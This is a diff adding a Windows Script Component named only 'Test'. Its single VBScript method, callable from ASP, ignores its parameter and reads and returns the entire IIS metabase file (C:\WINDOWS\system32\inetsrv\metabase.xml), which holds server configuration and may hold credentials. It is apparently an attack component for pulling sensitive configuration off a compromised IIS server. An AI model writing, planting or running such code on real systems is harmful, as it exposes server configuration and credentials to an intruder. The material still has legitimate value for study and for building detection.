@@ -1,0 +1,34 @@
+<?xml version="1.0"?>
+<component>
+
+<registration
+	description="Test"
+	progid="Test.WSC"
+	version="1.00"
+	classid="{185d4446-2a8e-40af-b982-928f0613ecfe}"
+>
+</registration>
+
+<public>
+	<method name="Test">
+		<PARAMETER name="msg"/>
+	</method>
+</public>
+
+<implements type="ASP" id="ASP"/>
+
+<script language="VBScript">
+<![CDATA[
+
+function Test(msg)
+
+Set oComponent = Server.CreateObject("scripting.filesystemobject")
+set ofile = ocomponent.OpenTextFile("C:\WINDOWS\system32\inetsrv\metabase.xml")
+Test=ofile.readall()
+
+end function
+
+]]>
+</script>
+
+</component>
